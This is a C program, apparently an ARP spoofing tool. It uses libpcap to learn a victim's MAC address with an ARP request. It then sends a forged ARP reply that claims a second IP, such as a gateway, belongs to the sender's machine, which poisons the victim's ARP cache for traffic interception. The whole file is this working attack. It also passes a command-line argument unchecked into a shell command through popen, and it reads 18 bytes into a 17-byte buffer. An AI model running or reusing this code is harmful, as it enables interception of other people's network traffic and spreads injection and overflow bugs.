#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#define ETHERTYPE_ARP 0x0806
struct ether_header
{
	uint8_t ether_dhost[6];      
	uint8_t ether_shost[6];
	uint16_t ether_type;
};
struct arp{
	uint16_t hdtype;
	uint16_t pttype;
	uint8_t hdadd_len;
	uint8_t ptadd_len;
	uint16_t op;
	uint8_t	ar_sha[6];
	uint8_t ar_spa[4];
	uint8_t	ar_tha[6];
	uint8_t ar_tpa[4];
};
int main(int argc, char* argv[]){
	FILE * fp;
	pcap_t * handle;
	char buff[17];
	char buff1[16];
	uint8_t buff2[4];
	char buff3[100] = "cat /sys/class/net/";
	char buff4[20] = "/address";
	char * dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	unsigned char packet[42];
	int i=0,j=0;
	struct ether_header * eth; 
	struct ether_header * rcv_eth;
	struct arp * arp;
	struct arp * rcv_arp;
	struct pcap_pkthdr *header;
	const u_char * rcv_packet;
	eth = (struct ether_header *)packet;
	arp = (struct arp *)(packet+14);
	strcat(buff3,argv[1]);
	strcat(buff3,buff4);
	fp = popen(buff3, "r");

    	if (fp == NULL)
    	{
        	perror("erro : ");
        	exit(0);
    	}

	fgets(buff, 18, fp);
	for(i=0;i<18;i++){
                if((i+1)%3==0 && i!=0){
			++j;
			continue;
		}
		if(i%3==0){
			eth->ether_shost[j]=16*(((int)buff[i]>96)?(int)buff[i]-87:(int)buff[i]-48);
			arp->ar_sha[j] = eth->ether_shost[j];
		}
		if((i+2)%3==0){
			eth->ether_shost[j]+=((int)buff[i]>96)?(int)buff[i]-87:(int)buff[i]-48;
			arp->ar_sha[j] = eth->ether_shost[j];
		}
	}
	fp = popen("ip addr | grep 'inet ' | grep brd | awk '{print $2}' | awk -F/ '{print $1}'", "r");
	if (fp == NULL)
        {
                perror("erro : ");
                exit(0);
        }
	fgets(buff1, 16, fp);
	inet_pton(AF_INET,(const char *)buff1,arp->ar_spa);
	inet_pton(AF_INET,(const char *)argv[2],arp->ar_tpa);
	for(i=0;i<6;i++){
		eth->ether_dhost[i]=0xff;
		arp->ar_tha[i]=0x00;
	}
	eth->ether_type = htons(ETHERTYPE_ARP);
	arp->hdtype = htons(0x01);
	arp->pttype = htons(0x0800);
	arp->hdadd_len = 6;
	arp->ptadd_len = 4;
	arp->op = htons(0x01);
	
	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
        if (handle == NULL) {
        	fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
        	return(2);
        }
	pcap_sendpacket(handle,packet,sizeof(packet));
	while(1){
		i = pcap_next_ex(handle, &header,&rcv_packet);
		rcv_eth = (struct ether_header *)rcv_packet;
		if(ETHERTYPE_ARP!=ntohs(rcv_eth->ether_type))continue;
		rcv_arp = (struct arp *)(rcv_packet+14);
		if(2!=ntohs(rcv_arp->op))continue;
		inet_pton(AF_INET,argv[2],buff2);
		if(!strncmp((char *)buff2,(char *)(rcv_arp->ar_spa),4)){
			strncpy(arp->ar_tha,rcv_arp->ar_sha,6);
			break;
		}
	}
	inet_pton(AF_INET,(const char *)argv[3],arp->ar_spa);	
	arp->op = htons(0x02);
	pcap_sendpacket(handle,packet,sizeof(packet));
	return 0;
}
